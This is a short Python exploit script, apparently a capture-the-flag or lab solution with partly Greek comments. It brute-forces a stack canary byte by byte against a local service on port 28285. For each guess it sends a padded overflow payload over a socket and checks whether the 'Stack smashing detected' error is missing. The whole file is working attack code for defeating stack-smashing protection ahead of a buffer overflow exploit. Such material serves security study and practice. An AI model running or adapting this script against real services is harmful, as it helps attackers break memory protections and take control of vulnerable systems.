import socket

def solve():
    host = '127.0.0.1'
    port = 28285
    padding = b"A" * 116
    known_canary = b""

    print("--- Starting Brute-force with Sockets ---")

    for i in range(4):
        print(f"Searching for byte {i}...")
        for candidate in range(256):
            try:
                # Δημιουργία σύνδεσης
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.2)
                s.connect((host, port))
                
                # Payload construction
                payload = padding + known_canary + bytes([candidate])
                s.sendall(payload)
                
                # Λήψη απάντησης
                try:
                    data = s.recv(1024)
                except socket.timeout:
                    data = b""
                
                s.close()

                # Αν ΔΕΝ περιέχει το μήνυμα σφάλματος, το byte είναι σωστό
                if b"Stack smashing detected" not in data:
                    known_canary += bytes([candidate])
                    print(f"Found byte {i}: {hex(candidate)}")
                    break
            except Exception as e:
                continue

    print(f"FINAL_CANARY: {known_canary.hex()}")

if __name__ == "__main__":
    solve()